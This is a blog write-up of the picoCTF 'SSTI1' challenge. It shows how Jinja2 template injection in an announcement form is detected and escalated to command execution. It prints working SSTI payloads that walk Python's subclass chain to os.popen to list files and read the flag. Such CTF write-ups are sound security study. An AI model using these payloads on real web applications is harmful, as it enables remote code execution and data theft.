---
layout: post
title: "picoCTF - SSTI1"
date: 2025-04-20 12:00:00 +0200
categories: [CTF, picoCTF, Web, SSTI]
tags: [CTF, writeup, picoctf, ssti, template-injection, web-security]
description: "Writeup for picoCTF 'SSTI1' — covering Server-Side Template Injection (SSTI) in web applications."
image:
  path: /assets/img/picoctf/picoctf.png
  alt: "picoCTF SSTI1 challenge screenshot"
toc: true
mermaid: false
math: false
comments: false
---


## Overview

This picoCTF challenge involved a basic web app that allowed users to "announce whatever you want!" through a form input. Upon testing, I discovered the site was vulnerable to **Server-Side Template Injection (SSTI)** using **Jinja2**, which I escalated to **Remote Code Execution (RCE)**.

---

## Step 1: Input Reflection

The homepage contained an input field and an "Ok" button.
![Input Reflection](/assets/img/picoctf/ssti1/img1.png)
I started by typing:
```
test
```

The result page rendered:
![Input Reflection](/assets/img/picoctf/ssti1/img2.png)

This confirmed that input was reflected directly into a rendered template.

---

## Step 2: Detecting SSTI

I then submitted:

```md
{% raw %}{{ 7*7 }}{% endraw %}
```

The result:

![SSTI Result](/assets/img/picoctf/ssti1/img4.png)

Confirmed: Jinja2 is evaluating input — the app is vulnerable to SSTI.

---

## Step 3: Gaining RCE via Python Object Chain

I used Jinja2’s ability to traverse Python internals and executed system commands:
```jinja2
{% raw %}
{{ ''.__class__ }}                              → <class 'str'>
{{ ''.__class__.__mro__ }}                      → method resolution order
{{ ''.__class__.__mro__[1] }}                   → <class 'object'>
{{ ''.__class__.__mro__[1].__subclasses__() }}  → list of all subclasses
{% endraw %}
```

I found the correct index (e.g., 408) with some trial and error:

```jinja2
{% raw %} {{ ''.__class__.__mro__[1].__subclasses__()[408] }} {% endraw %}
```

---

## Step 4: Executing Commands

Now I used that class to run system commands:

```jinja2
{% raw %} {{ ''.__class__.__mro__[1].__subclasses__()[408].__init__.__globals__['os'].popen('ls').read() }} {% endraw %}
```

This listed the files on the server. One of them was `flag`.

To read the flag:

```jinja2
{% raw %} {{ ''.__class__.__mro__[1].__subclasses__()[408].__init__.__globals__['os'].popen('cat flag').read() }} {% endraw %}
```

Boom — the flag was revealed.

---

## Conclusion

This challenge is a textbook demonstration of how SSTI in Jinja2 can lead to full server compromise. Always validate and sanitize user input, and never pass raw data into templates.

**Flag:** `picoCTF{example_flag_here}`

